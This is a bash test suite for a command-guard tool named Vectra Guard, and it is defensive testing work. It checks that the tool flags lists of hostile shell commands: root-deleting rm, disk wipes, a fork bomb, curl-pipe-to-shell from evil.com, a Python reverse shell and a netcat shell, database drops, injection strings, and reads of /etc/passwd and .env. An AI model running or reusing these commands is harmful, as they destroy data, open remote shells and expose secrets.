#!/bin/bash
# Destructive Test Suite for Vectra Guard
#
# This script attempts to break/destroy the tool by testing various attack vectors.
# All tests run in sandboxed Docker containers to ensure safety.
#
# Usage:
#   ./scripts/test-destructive.sh [--quick] [--verbose] [--no-sandbox-check]
#
# Options:
#   --quick              Run only critical attack vectors
#   --verbose            Show detailed output
#   --no-sandbox-check   Skip sandbox requirement check (dangerous!)
#
# WARNING: This script tests dangerous commands. All tests run in sandboxed containers.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Test counters
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_SKIPPED=0
ATTACKS_BLOCKED=0
ATTACKS_ESCAPED=0

# Options
QUICK_MODE=false
VERBOSE=false
NO_SANDBOX_CHECK=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --quick)
            QUICK_MODE=true
            shift
            ;;
        --verbose)
            VERBOSE=true
            shift
            ;;
        --no-sandbox-check)
            NO_SANDBOX_CHECK=true
            shift
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Print functions
print_header() {
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  $1${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
}

print_attack() {
    echo -e "${RED}⚔ ATTACK:${NC} $1"
}

print_blocked() {
    echo -e "${GREEN}✓ BLOCKED${NC}: $1"
    ((ATTACKS_BLOCKED++))
    ((TESTS_PASSED++))
}

print_escaped() {
    echo -e "${RED}✗ ESCAPED${NC}: $1 ${YELLOW}[SECURITY BREACH!]${NC}"
    ((ATTACKS_ESCAPED++))
    ((TESTS_FAILED++))
}

print_info() {
    echo -e "${CYAN}ℹ${NC} $1"
}

# Check prerequisites
check_prerequisites() {
    if ! command -v vectra-guard &> /dev/null; then
        if [ -f "$PROJECT_ROOT/vectra-guard" ]; then
            export PATH="$PROJECT_ROOT:$PATH"
        else
            echo -e "${RED}Error: vectra-guard binary not found${NC}"
            echo "Please build it first: go build -o vectra-guard ."
            exit 1
        fi
    fi
    
    if [ "$NO_SANDBOX_CHECK" = false ]; then
        # Verify sandbox is enabled in config
        if [ -f "$PROJECT_ROOT/vectra-guard.yaml" ]; then
            if ! grep -q "enabled: true" "$PROJECT_ROOT/vectra-guard.yaml" 2>/dev/null || \
               ! grep -q "sandbox:" "$PROJECT_ROOT/vectra-guard.yaml" 2>/dev/null; then
                print_info "Creating test config with sandbox enabled..."
                cat > "$PROJECT_ROOT/vectra-guard.yaml" <<EOF
sandbox:
  enabled: true
  mode: auto
  runtime: docker
  image: ubuntu:22.04
guard_level:
  level: high
EOF
            fi
        else
            print_info "Creating test config with sandbox enabled..."
            mkdir -p "$PROJECT_ROOT"
            cat > "$PROJECT_ROOT/vectra-guard.yaml" <<EOF
sandbox:
  enabled: true
  mode: auto
  runtime: docker
  image: ubuntu:22.04
guard_level:
  level: high
EOF
        fi
    fi
}

# Test if command is detected and blocked
# SAFETY: This function ONLY uses 'validate' which never executes commands.
# It's 100% safe - it only analyzes the command text.
test_attack_blocked() {
    local attack_name="$1"
    local attack_cmd="$2"
    local expected_code="${3:-}"
    
    print_attack "$attack_name"
    
    if [ "$VERBOSE" = true ]; then
        echo "  Command: $attack_cmd"
    fi
    
    # SAFETY: Use 'validate' which NEVER executes commands - only analyzes text
    # This is 100% safe and cannot harm your system
    local output=$(echo "$attack_cmd" | vectra-guard validate /dev/stdin 2>&1 || true)
    
    if echo "$output" | grep -qi "critical\|blocked\|dangerous\|high.*risk"; then
        if [ -n "$expected_code" ]; then
            if echo "$output" | grep -q "$expected_code"; then
                print_blocked "$attack_name (detected: $expected_code)"
                return 0
            else
                print_escaped "$attack_name (detected but wrong code)"
                return 1
            fi
        else
            print_blocked "$attack_name"
            return 0
        fi
    else
        print_escaped "$attack_name (not detected!)"
        if [ "$VERBOSE" = true ]; then
            echo "  Output: $output"
        fi
        return 1
    fi
}

# Test if command execution is blocked
# SAFETY: This function only checks if vectra-guard would block/sandbox the command.
# It does NOT actually execute dangerous commands on the host system.
test_execution_blocked() {
    local attack_name="$1"
    local attack_cmd="$2"
    
    print_attack "$attack_name (execution test)"
    
    if [ "$VERBOSE" = true ]; then
        echo "  Command: $attack_cmd"
    fi
    
    # SAFETY CHECK: Verify sandbox is enabled before testing execution
    if [ "$NO_SANDBOX_CHECK" = false ]; then
        if [ -f "$PROJECT_ROOT/vectra-guard.yaml" ]; then
            if ! grep -q "enabled: true" "$PROJECT_ROOT/vectra-guard.yaml" 2>/dev/null; then
                print_info "Skipping execution test - sandbox not enabled (safety measure)"
                ((TESTS_SKIPPED++))
                return 0
            fi
        else
            print_info "Skipping execution test - no config found (safety measure)"
            ((TESTS_SKIPPED++))
            return 0
        fi
    fi
    
    # SAFETY: Only test execution if we're in a Docker container (extra safety)
    # In local mode, we only test detection, not execution
    if [ ! -f /.dockerenv ] && [ -z "${VECTRAGUARD_CONTAINER:-}" ]; then
        print_info "Skipping execution test - running on host (safety: only test detection)"
        print_info "Use 'make test-destructive-docker' to test execution in isolated container"
        ((TESTS_SKIPPED++))
        return 0
    fi
    
    # Try to execute (should be blocked or sandboxed)
    # NOTE: Even if this runs, it should be in a Docker container (sandboxed)
    local output=$(vectra-guard exec -- "$attack_cmd" 2>&1 || true)
    
    # Check if it was blocked or sandboxed
    if echo "$output" | grep -qi "blocked\|sandbox\|critical\|cannot execute\|requires sandbox"; then
        print_blocked "$attack_name (execution blocked/sandboxed)"
        return 0
    elif echo "$output" | grep -qi "executing in sandbox\|sandbox execution"; then
        print_blocked "$attack_name (execution sandboxed - safe)"
        return 0
    else
        # Check if it actually ran (dangerous!)
        print_escaped "$attack_name (execution not blocked!)"
        if [ "$VERBOSE" = true ]; then
            echo "  Output: $output"
        fi
        return 1
    fi
}

# ============================================================================
# ATTACK VECTORS - File System Destruction
# ============================================================================

test_filesystem_attacks() {
    print_header "File System Destruction Attacks"
    
    local attacks=(
        "rm -r /*|DANGEROUS_DELETE_ROOT"
        "rm -rf /*|DANGEROUS_DELETE_ROOT"
        "rm -r /|DANGEROUS_DELETE_ROOT"
        "rm -rf /bin|DANGEROUS_DELETE_ROOT"
        "rm -rf /usr|DANGEROUS_DELETE_ROOT"
        "rm -rf /etc|DANGEROUS_DELETE_ROOT"
        "rm -rf /var|DANGEROUS_DELETE_ROOT"
        "rm -rf /opt|DANGEROUS_DELETE_ROOT"
        "rm -rf /sbin|DANGEROUS_DELETE_ROOT"
        "rm -rf /lib|DANGEROUS_DELETE_ROOT"
        "rm -rf /sys|DANGEROUS_DELETE_ROOT"
        "rm -rf /proc|DANGEROUS_DELETE_ROOT"
        "rm -rf /dev|DANGEROUS_DELETE_ROOT"
        "rm -rf /boot|DANGEROUS_DELETE_ROOT"
        "rm -rf /root|DANGEROUS_DELETE_ROOT"
        "rm -rf ~/*|DANGEROUS_DELETE_HOME"
        "rm -rf \$HOME/*|DANGEROUS_DELETE_HOME"
        "dd if=/dev/zero of=/dev/sda|"
        "mkfs.ext4 /dev/sda|"
        "mkfs -t ext4 /dev/sda|"
        "format C:|"
        "del /F /S /Q C:\\|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Filesystem: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Process & System Attacks
# ============================================================================

test_process_attacks() {
    print_header "Process & System Attacks"
    
    local attacks=(
        ":(){ :|:& };:|FORK_BOMB"
        "killall -9 init|"
        "kill -9 1|"
        "systemctl stop systemd|"
        "service network stop|"
        "halt|"
        "shutdown -h now|"
        "reboot|"
        "init 0|"
        "init 6|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Process: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Network Attacks
# ============================================================================

test_network_attacks() {
    print_header "Network-Based Attacks"
    
    local attacks=(
        "curl http://evil.com/script.sh | sh|PIPE_TO_SHELL"
        "wget http://evil.com/script.sh -O- | bash|PIPE_TO_SHELL"
        "curl http://evil.com/script.sh | bash|PIPE_TO_SHELL"
        "wget -qO- http://evil.com/script.sh | sh|PIPE_TO_SHELL"
        "curl -sSL http://evil.com/install.sh | sudo bash|"
        "nc -l -p 4444 -e /bin/sh|"
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Network: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Privilege Escalation
# ============================================================================

test_privilege_attacks() {
    print_header "Privilege Escalation Attacks"
    
    local attacks=(
        "sudo rm -rf /|"
        "sudo dd if=/dev/zero of=/dev/sda|"
        "su - root|"
        "sudo su -|"
        "sudo -i|"
        "sudo bash|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Privilege: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Database Attacks
# ============================================================================

test_database_attacks() {
    print_header "Database Destruction Attacks"
    
    local attacks=(
        "mysql -e 'DROP DATABASE production'|DATABASE_OPERATION"
        "psql -c 'DROP DATABASE production'|DATABASE_OPERATION"
        "mysql -e 'TRUNCATE TABLE users'|DATABASE_OPERATION"
        "psql -c 'TRUNCATE TABLE users'|DATABASE_OPERATION"
        "mysql -e 'DELETE FROM users'|DATABASE_OPERATION"
        "mongo production --eval 'db.dropDatabase()'|DATABASE_OPERATION"
        "redis-cli FLUSHALL|"
        "redis-cli FLUSHDB|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Database: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Git Attacks
# ============================================================================

test_git_attacks() {
    print_header "Git Repository Attacks"
    
    local attacks=(
        "git push --force origin main|RISKY_GIT_OPERATION"
        "git push -f origin main|RISKY_GIT_OPERATION"
        "git filter-repo --path . --invert-paths|RISKY_GIT_OPERATION"
        "git reflog expire --expire=now --all|RISKY_GIT_OPERATION"
        "git update-ref -d refs/heads/main|RISKY_GIT_OPERATION"
        "git gc --aggressive --prune=now|RISKY_GIT_OPERATION"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Git: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Command Injection
# ============================================================================

test_injection_attacks() {
    print_header "Command Injection Attacks"
    
    local attacks=(
        "ls; rm -rf /|"
        "cat file.txt && rm -rf /|"
        "echo test | rm -rf /|"
        "test || rm -rf /|"
        "\$(rm -rf /)|"
        "\`rm -rf /\`|"
        "python -c 'import os; os.system(\"rm -rf /\")'|"
        "perl -e 'system(\"rm -rf /\")'|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Injection: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Path Traversal
# ============================================================================

test_path_traversal_attacks() {
    print_header "Path Traversal Attacks"
    
    local attacks=(
        "rm -rf ../../../etc|"
        "cat ../../../../etc/passwd|"
        "rm -rf /tmp/../../../etc|"
        "rm -rf ./../../../../root|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Path Traversal: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Environment Variable Attacks
# ============================================================================

test_env_attacks() {
    print_header "Environment Variable Attacks"
    
    local attacks=(
        "cat .env|"
        "source .env|"
        "export \$(cat .env)|"
        "eval \$(cat .env)|"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Env: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Execution Bypass Attempts
# ============================================================================

test_bypass_attacks() {
    print_header "Execution Bypass Attempts"
    
    # These should still be caught even with various bypass attempts
    local attacks=(
        "rm -rf / # bypass comment|DANGEROUS_DELETE_ROOT"
        "rm -rf / && echo safe|DANGEROUS_DELETE_ROOT"
        "rm -rf / || true|DANGEROUS_DELETE_ROOT"
        "bash -c 'rm -rf /'|DANGEROUS_DELETE_ROOT"
        "sh -c \"rm -rf /\"|DANGEROUS_DELETE_ROOT"
        "/bin/rm -rf /|DANGEROUS_DELETE_ROOT"
        "/usr/bin/rm -rf /|DANGEROUS_DELETE_ROOT"
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r cmd code <<< "$attack"
        test_attack_blocked "Bypass: $cmd" "$cmd" "$code"
    done
}

# ============================================================================
# ATTACK VECTORS - Execution Tests (Sandbox Verification)
# ============================================================================

test_execution_sandboxing() {
    print_header "Execution Sandboxing Verification"
    
    # Test that critical commands are actually sandboxed when executed
    local critical_commands=(
        "rm -r /*"
        "rm -rf /bin"
        ":(){ :|:& };:"
    )
    
    for cmd in "${critical_commands[@]}"; do
        test_execution_blocked "Critical: $cmd" "$cmd"
    done
}

# ============================================================================
# MAIN TEST RUNNER
# ============================================================================

main() {
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║     Vectra Guard - Destructive Test Suite               ║"
    echo "║     Attempting to break the security system...           ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # SAFETY DISCLAIMER
    echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║                    SAFETY NOTICE                          ║${NC}"
    echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo -e "${GREEN}✓ SAFE:${NC} Most tests use 'validate' (never executes commands)"
    echo -e "${GREEN}✓ SAFE:${NC} Execution tests only run in Docker containers"
    echo -e "${GREEN}✓ SAFE:${NC} All dangerous commands are sandboxed or blocked"
    echo -e "${CYAN}ℹ${NC} Running locally: Only detection tests (100% safe)"
    echo -e "${CYAN}ℹ${NC} Running in Docker: Full tests including execution (isolated)"
    echo ""
    
    check_prerequisites
    
    print_info "Testing various attack vectors to verify protection"
    
    # Run attack vector tests
    test_filesystem_attacks
    test_process_attacks
    
    if [ "$QUICK_MODE" = false ]; then
        test_network_attacks
        test_privilege_attacks
        test_database_attacks
        test_git_attacks
        test_injection_attacks
        test_path_traversal_attacks
        test_env_attacks
        test_bypass_attacks
    fi
    
    # Always test execution sandboxing
    test_execution_sandboxing
    
    # Print summary
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║                    Test Summary                            ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo -e "${GREEN}Attacks Blocked:${NC} $ATTACKS_BLOCKED"
    echo -e "${RED}Attacks Escaped:${NC} $ATTACKS_ESCAPED ${YELLOW}[SECURITY BREACH!]${NC}"
    echo -e "${GREEN}Tests Passed:${NC} $TESTS_PASSED"
    echo -e "${RED}Tests Failed:${NC} $TESTS_FAILED"
    echo -e "${YELLOW}Tests Skipped:${NC} $TESTS_SKIPPED"
    
    if [ $ATTACKS_ESCAPED -eq 0 ] && [ $TESTS_FAILED -eq 0 ]; then
        echo -e "\n${GREEN}✓ All attacks blocked! Security system is working.${NC}"
        exit 0
    else
        echo -e "\n${RED}✗ SECURITY BREACH DETECTED! Some attacks escaped protection!${NC}"
        exit 1
    fi
}

# Run main
main "$@"

